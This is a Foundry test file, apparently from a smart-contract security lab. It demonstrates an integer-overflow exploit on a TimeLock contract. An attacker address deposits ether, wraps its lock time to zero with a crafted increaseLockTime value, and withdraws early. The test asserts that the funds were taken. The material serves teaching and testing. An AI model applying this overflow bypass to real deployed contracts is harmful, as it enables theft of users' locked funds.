// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/IntegerOverflow.sol";

contract IntegerOverflowTest is Test {
    TimeLock lock;
    address attacker = address(0xBAD);

    function setUp() public {
        lock = new TimeLock();
        vm.deal(attacker, 1 ether);
    }

    function testOverflowBypass() public {
        vm.startPrank(attacker);

        lock.deposit{value: 1 ether}();

        console.log("Lock time after deposit:", lock.lockTime(attacker));

        uint256 overflowAmount = type(uint256).max - lock.lockTime(attacker) + 1;
        lock.increaseLockTime(overflowAmount);

        console.log("Lock time after overflow:", lock.lockTime(attacker));

        lock.withdraw();

        console.log("Attacker withdrew funds before lock expired");
        console.log("Attacker balance:", attacker.balance);

        vm.stopPrank();

        assertEq(attacker.balance, 1 ether);
    }
}
